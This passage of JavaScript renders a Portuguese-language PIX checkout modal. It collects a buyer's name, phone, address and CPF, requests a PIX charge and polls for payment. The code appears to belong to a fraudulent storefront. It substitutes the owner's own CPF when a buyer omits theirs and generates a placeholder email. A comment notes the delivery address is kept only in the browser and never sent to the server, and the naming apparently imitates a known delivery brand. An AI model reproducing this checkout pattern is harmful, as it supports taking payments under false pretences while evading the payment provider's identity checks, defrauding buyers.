    if (v.length > 6)  return '('+v.slice(0,2)+') '+v.slice(2,6)+'-'+v.slice(6);
    return raw || '';
  }
  function esc(s) { return (s||'').replace(/"/g,'&quot;'); }

  var sty = 'display:block;width:100%;box-sizing:border-box;padding:11px 13px;font-size:15px;'
          + 'font-family:\'Poppins\',sans-serif;border:1.5px solid #e8e8e8;border-radius:10px;'
          + 'background:#fafafa;color:#1a1a1a;outline:none;';
  var lbl = 'display:block;font-size:10px;font-weight:700;color:#aaa;'
          + 'text-transform:uppercase;letter-spacing:.6px;margin-bottom:5px;';

  // ── Seção contato ─────────────────────────────────────────────────────────
  var nomeVal = contato.nome ? ' value="' + esc(contato.nome) + '"' : '';
  var telVal  = contato.tel  ? ' value="' + esc(fmtTelDisplay(contato.tel)) + '"' : '';

  var contaHtml = '<div style="margin-bottom:10px">'
    + '<label style="' + lbl + '">👤 Contato</label>'
    + '<input id="pix-nome" placeholder="Nome completo *"' + nomeVal
    +   ' style="' + sty + 'margin-bottom:7px">'
    + '<input id="pix-tel" placeholder="WhatsApp (DDD + número) *"' + telVal
    +   ' maxlength="15" inputmode="numeric" style="' + sty + '">'
    + '</div>';

  // ── Seção endereço ────────────────────────────────────────────────────────
  var endHtml;
  if (end.rua) {
    var endL1 = end.rua + (end.numero ? ', ' + end.numero : '') + (end.compl ? ' — ' + end.compl : '');
    var endL2 = (end.bairro ? end.bairro + ' • ' : '') + end.cidade + '/' + end.estado + (end.cep ? ' — CEP ' + end.cep : '');
    endHtml = '<div style="background:#f8f8f8;border:1px solid #eee;border-radius:10px;padding:10px 12px;margin-bottom:10px">'
      + '<div style="' + lbl + '">📦 Endereço de entrega</div>'
      + '<div style="font-size:13px;color:#1a1a1a;line-height:1.6">' + endL1 + '<br>' + endL2 + '</div>'
      + '</div>';
  } else {
    var styF = sty.replace('display:block;width:100%;', '');
    endHtml = '<div style="margin-bottom:10px">'
      + '<label style="' + lbl + '">📦 Endereço de entrega</label>'
      + '<input id="pix-cep" placeholder="CEP * (00000-000)" maxlength="9" inputmode="numeric" style="' + sty + 'margin-bottom:7px">'
      + '<input id="pix-rua" placeholder="Rua / Avenida *" style="' + sty + 'margin-bottom:7px">'
      + '<div style="display:flex;gap:6px;margin-bottom:7px">'
      +   '<input id="pix-numero" placeholder="Nº *" style="' + styF + 'width:38%">'
      +   '<input id="pix-compl" placeholder="Complemento" style="' + styF + 'flex:1">'
      + '</div>'
      + '<input id="pix-bairro" placeholder="Bairro *" style="' + sty + 'margin-bottom:7px">'
      + '<div style="display:flex;gap:6px">'
      +   '<input id="pix-cidade" placeholder="Cidade *" style="' + styF + 'flex:1">'
      +   '<input id="pix-estado" placeholder="UF *" maxlength="2" style="' + styF + 'width:30%;text-transform:uppercase;text-align:center">'
      + '</div>'
      + '</div>';
  }

  // ── Seção CPF ─────────────────────────────────────────────────────────────
  var cpfHtml = '<div>'
    + '<label style="' + lbl + '">📄 CPF</label>'
    + '<p style="font-size:11px;color:#999;margin-bottom:7px">Para processar seu pagamento via PIX e emitir nota fiscal</p>'
    + '<input id="pix-cpf" placeholder="000.000.000-00" maxlength="14" inputmode="numeric" style="' + sty + '">'
    + '<label style="display:flex;align-items:center;gap:6px;margin-top:9px;cursor:pointer">'
    +   '<input type="checkbox" id="nao-sei-cpf" style="width:15px;height:15px;accent-color:#ffcc01;cursor:pointer;flex-shrink:0">'
    +   '<span style="font-size:12px;color:#888;font-family:\'Poppins\',sans-serif">Não lembro meu CPF</span>'
    + '</label>'
    + '</div>';

  // ── Etapa 1: formulário compacto ──────────────────────────────────────────
  var resultado = await Swal.fire({
    title: '<span style="font-size:17px">Finalizar Pedido</span>',
    html:  '<div style="text-align:center;margin-bottom:14px">'
         +   '<img src="' + imgSrc + '" style="width:64px;height:64px;object-fit:contain;border-radius:10px;border:2px solid #eee;">'
         +   '<p style="margin:7px 0 2px;font-weight:700;color:#333;font-size:14px">' + produto + '</p>'
         +   '<p style="font-size:19px;font-weight:700;color:#077c22">R$ ' + valorFormatado + '</p>'
         + '</div>'
         + '<hr style="border:none;border-top:1px solid #eee;margin-bottom:12px">'
         + '<div style="text-align:left">'
         + contaHtml + endHtml + cpfHtml
         + '</div>',

    confirmButtonText:  'Gerar PIX →',
    confirmButtonColor: '#FFCC00',
    showCancelButton:   true,
    cancelButtonText:   'Voltar',
    cancelButtonColor:  '#ffffff',
    allowOutsideClick:  false,
    width: '520px',

    didOpen: function() {
      var confirmBtn = document.querySelector('.swal2-confirm');
      var cancelBtn  = document.querySelector('.swal2-cancel');
      if (confirmBtn) { confirmBtn.style.color = '#1A1A1A'; confirmBtn.style.fontWeight = '700'; confirmBtn.style.border = 'none'; }
      if (cancelBtn)  { cancelBtn.style.color  = '#666';    cancelBtn.style.border = '1px solid #ccc'; }

      // Foco amarelo nos inputs de texto
      document.querySelectorAll('#swal2-html-container input:not([type="checkbox"])').forEach(function(i) {
        i.addEventListener('focus', function() { if (!this.disabled) { this.style.borderColor = '#ffcc01'; this.style.background = '#fff'; } });
        i.addEventListener('blur',  function() { this.style.borderColor = '#e8e8e8'; this.style.background = '#fafafa'; });
      });

      // Máscara telefone
      var telEl = document.getElementById('pix-tel');
      if (telEl) telEl.addEventListener('input', function() {
        var v = this.value.replace(/\D/g,'').slice(0,11);
        if (v.length > 10) v = '('+v.slice(0,2)+') '+v.slice(2,7)+'-'+v.slice(7);
        else if (v.length > 6)  v = '('+v.slice(0,2)+') '+v.slice(2,6)+'-'+v.slice(6);
        else if (v.length > 2)  v = '('+v.slice(0,2)+') '+v.slice(2);
        this.value = v;
      });

      // Máscara CPF
      document.getElementById('pix-cpf').addEventListener('input', function() {
        var v = this.value.replace(/\D/g,'').slice(0,11);
        if (v.length > 9)      v = v.slice(0,3)+'.'+v.slice(3,6)+'.'+v.slice(6,9)+'-'+v.slice(9);
        else if (v.length > 6) v = v.slice(0,3)+'.'+v.slice(3,6)+'.'+v.slice(6);
        else if (v.length > 3) v = v.slice(0,3)+'.'+v.slice(3);
        this.value = v;
      });

      // Checkbox "Não lembro meu CPF"
      document.getElementById('nao-sei-cpf').addEventListener('change', function() {
        var cpfInput = document.getElementById('pix-cpf');
        if (this.checked) {
          cpfInput.value    = '';
          cpfInput.disabled = true;
          cpfInput.style.opacity     = '0.4';
          cpfInput.style.borderColor = '#e8e8e8';
        } else {
          cpfInput.disabled      = false;
          cpfInput.style.opacity = '1';
          cpfInput.focus();
        }
      });

      // ViaCEP quando endereço não está salvo
      var cepEl = document.getElementById('pix-cep');
      if (cepEl) cepEl.addEventListener('input', function() {
        var v = this.value.replace(/\D/g,'').slice(0,8);
        if (v.length > 5) v = v.slice(0,5)+'-'+v.slice(5);
        this.value = v;
        if (v.replace('-','').length === 8) {
          fetch('https://viacep.com.br/ws/'+v.replace('-','')+'/json/')
            .then(function(r){ return r.json(); })
            .then(function(d){
              if (!d.erro) {
                document.getElementById('pix-rua').value    = d.logradouro || '';
                document.getElementById('pix-bairro').value = d.bairro     || '';
                document.getElementById('pix-cidade').value = d.localidade || '';
                document.getElementById('pix-estado').value = d.uf         || '';
                document.getElementById('pix-numero').focus();
              }
            }).catch(function(){});
        }
      });

      var estEl = document.getElementById('pix-estado');
      if (estEl) estEl.addEventListener('input', function() {
        this.value = this.value.toUpperCase().replace(/[^A-Z]/g,'');
      });
    },

    preConfirm: function() {
      var nomeEl   = document.getElementById('pix-nome');
      var telEl    = document.getElementById('pix-tel');
      var nome     = nomeEl ? nomeEl.value.trim() : (contato.nome || '');
      var telMask  = telEl  ? telEl.value.trim()  : (contato.tel  || '');
      var telRaw   = telMask.replace(/\D/g,'');
      var naoCpf   = document.getElementById('nao-sei-cpf').checked;
      var cpf      = naoCpf ? ZE_OWNER_CPF.replace(/\D/g,'') : document.getElementById('pix-cpf').value.replace(/\D/g,'');

      if (!nome || nome.split(/\s+/).length < 2) {
        Swal.showValidationMessage('Informe seu nome e sobrenome.');
        return false;
      }
      if (telRaw.length < 10 || telRaw.length > 11) {
        Swal.showValidationMessage('Telefone inválido — informe DDD + número.');
        return false;
      }
      if (cpf.length !== 11) {
        Swal.showValidationMessage('CPF inválido — informe os 11 dígitos.');
        return false;
      }

      // Atualiza contato salvo
      localStorage.setItem('ze_contato', JSON.stringify({ nome: nome, tel: telMask }));

      // Endereço: de localStorage ou dos campos do formulário
      var endDados = { cep: end.cep, rua: end.rua, numero: end.numero,
                       compl: end.compl, bairro: end.bairro,
                       cidade: end.cidade, estado: end.estado };
      if (!end.rua) {
        var cepV   = document.getElementById('pix-cep').value.trim();
        var rua    = document.getElementById('pix-rua').value.trim();
        var numero = document.getElementById('pix-numero').value.trim();
        var compl  = document.getElementById('pix-compl').value.trim();
        var bairro = document.getElementById('pix-bairro').value.trim();
        var cidade = document.getElementById('pix-cidade').value.trim();
        var estado = document.getElementById('pix-estado').value.trim();
        if (!cepV || cepV.replace('-','').length !== 8) { Swal.showValidationMessage('CEP inválido.'); return false; }
        if (!rua)    { Swal.showValidationMessage('Informe a rua/avenida.'); return false; }
        if (!numero) { Swal.showValidationMessage('Informe o número.'); return false; }
        if (!bairro) { Swal.showValidationMessage('Informe o bairro.'); return false; }
        if (!cidade) { Swal.showValidationMessage('Informe a cidade.'); return false; }
        if (!estado || estado.length !== 2) { Swal.showValidationMessage('Informe o estado (UF).'); return false; }
        endDados = { cep: cepV, rua: rua, numero: numero, compl: compl,
                     bairro: bairro, cidade: cidade, estado: estado };
      }

      var email = gerarEmailPedido();

      return { nome: nome, cpf: cpf, tel: telRaw, email: email,
               cep: endDados.cep, rua: endDados.rua, numero: endDados.numero,
               compl: endDados.compl || '', bairro: endDados.bairro,
               cidade: endDados.cidade, estado: endDados.estado };
    }
  });

  if (!resultado.value) return;
  var dados = resultado.value;

  // ── Etapa 2: loading ───────────────────────────────────────────────────────
  Swal.fire({
    title: 'Gerando seu PIX...',
    html:  '<p style="color:#777;font-size:14px">Aguarde um instante...</p>',
    allowOutsideClick: false,
    allowEscapeKey:    false,
    didOpen: function() { Swal.showLoading(); }
  });

  // ── Etapa 3: chamar o backend ──────────────────────────────────────────────
  var transacao;
  try {
    var response = await fetch('/api/criar-pix', {
      method:  'POST',
      headers: { 'Content-Type': 'application/json' },
      body:    JSON.stringify({
        produto: produto,
        valor:   valor,
        nome:    dados.nome,
        cpf:     dados.cpf,
        tel:     dados.tel,
        email:   dados.email
        // endereço (cep, rua, numero, bairro, cidade, estado) fica só no front
      })
    });
    transacao = await response.json();
    if (!response.ok) throw new Error(JSON.stringify(transacao));
  } catch (err) {
    var mensagemErro = err.message || 'Erro desconhecido';
    if (err instanceof TypeError && location.protocol === 'file:') {
      mensagemErro = 'Servidor não encontrado. Abra via http://localhost:3000 e não pelo arquivo diretamente.';
    }
    await Swal.fire({
      icon:               'error',
      title:              'Erro ao gerar PIX',
      html:               '<p style="font-size:13px;color:#555;word-break:break-word;text-align:left;background:#f8f8f8;padding:10px;border-radius:6px;max-height:120px;overflow:auto;">' + mensagemErro + '</p>',
      confirmButtonColor: '#FFCC00',
      confirmButtonText:  'OK',
      didOpen: function() {
        var btn = document.querySelector('.swal2-confirm');
        if (btn) btn.style.color = '#1A1A1A';
      }
    });
    return;
  }

  // ── Etapa 4: extrair dados PIX da resposta ────────────────────────────────
  // Estrutura Sunize: { id, pix: { payload }, status, hasError }
  var pixCode = (transacao.pix && transacao.pix.payload) ? transacao.pix.payload : '';
  var txId    = transacao.id || '';

  // Sunize não retorna imagem — gera QR a partir do payload
  var pixImg = pixCode
    ? 'https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=' + encodeURIComponent(pixCode)
    : '';

  pixAtualCodigo = pixCode;
  mostrarPixModal(produto, valorFormatado, pixCode, pixImg, txId);
}

function mostrarPixModal(produto, valorFormatado, pixCode, pixImg, txId) {
  var checkInterval;

  // QR Code com fallback de erro de imagem
  var qrHtml = pixImg
    ? '<img id="pix-qr-img" src="' + pixImg + '" alt="QR Code PIX"'
    +   ' style="width:210px;height:210px;display:block;margin:0 auto 14px;border:2px solid #eee;border-radius:10px;"'
    +   ' onerror="this.onerror=null;this.src=\'https://api.qrserver.com/v1/create-qr-code/?size=220x220&data='+encodeURIComponent(pixCode||'PIX')+'\'">'
    : '';

  var codigoHtml = pixCode
    ? '<div style="background:#f5f5f5;border:1px solid #ddd;border-radius:8px;padding:10px 12px;margin:10px 0 8px;word-break:break-all;font-size:11px;font-family:monospace;color:#444;text-align:left;max-height:68px;overflow:auto;line-height:1.5;">' + pixCode + '</div>'
    + '<button id="btn-copiar-pix" onclick="copiarPix()" style="background:#FFCC00;color:#1A1A1A;border:none;padding:13px 0;border-radius:8px;font-weight:700;cursor:pointer;font-size:15px;width:100%;letter-spacing:.2px;">📋 Copiar código PIX</button>'
    : '<p style="color:#bbb;font-size:13px;margin:8px 0;">Código PIX não disponível.</p>';

  Swal.fire({
    title: '<span style="color:#077c22">✅ PIX Gerado!</span>',
    html:  '<div style="text-align:center">'
         +   '<p style="color:#555;margin-bottom:2px">' + produto + '</p>'
         +   '<p style="font-size:22px;font-weight:700;color:#077c22;margin-bottom:16px">R$ ' + valorFormatado + '</p>'
         +   qrHtml
         +   '<p style="font-size:13px;color:#777;margin-bottom:4px">📱 Escaneie o QR Code ou copie o código:</p>'
         +   codigoHtml
         +   '<div id="pix-status-msg" style="margin-top:14px;padding:10px 12px;border-radius:8px;background:#fff8dc;color:#7a6000;font-size:13px;font-weight:600;">'
         +     '⏳ Aguardando confirmação do pagamento...'
         +   '</div>'
         +   '<p style="font-size:11px;color:#ccc;margin-top:10px;">Este PIX expira em 30 minutos</p>'
         + '</div>',
    confirmButtonText:  'Fechar',
    confirmButtonColor: '#FFCC00',
    allowOutsideClick:  false,
    didOpen: function() {
      var btn = document.querySelector('.swal2-confirm');
      if (btn) { btn.style.color = '#1A1A1A'; btn.style.fontWeight = '700'; }
      if (txId) {
        checkInterval = setInterval(function() { verificarPagamento(txId, checkInterval); }, 5000);
      }
    },
    willClose: function() {
      if (checkInterval) clearInterval(checkInterval);
    }
  });
}

async function verificarPagamento(txId, interval) {
  try {
    var response = await fetch('/api/status-pix/' + txId);
    var data     = await response.json();
    var status   = (data.status || '').toLowerCase();
    var msgEl    = document.getElementById('pix-status-msg');

    if (status === 'authorized' || status === 'paid' || status === 'approved' || status === 'completed') {
      if (interval) clearInterval(interval);
      if (msgEl) {
        msgEl.style.background = '#d4edda';
        msgEl.style.color      = '#155724';
        msgEl.textContent      = '✅ Pagamento confirmado!';
      }
      setTimeout(function() {
        Swal.fire({
          icon:               'success',
          title:              '🎉 Pedido Confirmado!',
          text:               'Seu pagamento foi aprovado! Em breve você receberá uma confirmação.',
          confirmButtonColor: '#FFCC00',
          confirmButtonText:  'Ótimo!',
          didOpen: function() {
            var btn = document.querySelector('.swal2-confirm');
            if (btn) btn.style.color = '#1A1A1A';
          }
        });
      }, 800);
    }
  } catch (e) { /* silencioso */ }
}

function copiarPix() {
  var codigo = pixAtualCodigo;
  if (!codigo) return;

  function onSuccess() {
    var btn = document.getElementById('btn-copiar-pix');
    if (!btn) return;
    btn.textContent       = '✅ Copiado!';
    btn.style.background  = '#077c22';
    btn.style.color       = '#fff';
    setTimeout(function() {
      btn.textContent      = '📋 Copiar código PIX';
      btn.style.background = '#FFCC00';
      btn.style.color      = '#1A1A1A';
    }, 3000);
  }

  if (navigator.clipboard) {
    navigator.clipboard.writeText(codigo).then(onSuccess).catch(function() { fallbackCopiar(codigo, onSuccess); });
  } else {
    fallbackCopiar(codigo, onSuccess);
  }
}

function fallbackCopiar(texto, callback) {
  var ta        = document.createElement('textarea');
  ta.value      = texto;
  ta.style.position = 'fixed';
  ta.style.left     = '-9999px';
  document.body.appendChild(ta);
  ta.focus(); ta.select();
  try { document.execCommand('copy'); if (callback) callback(); } catch (e) {}
  document.body.removeChild(ta);
}

// ===== INIT =====
document.addEventListener("DOMContentLoaded", function() {
  escolherLocalizacao();
});
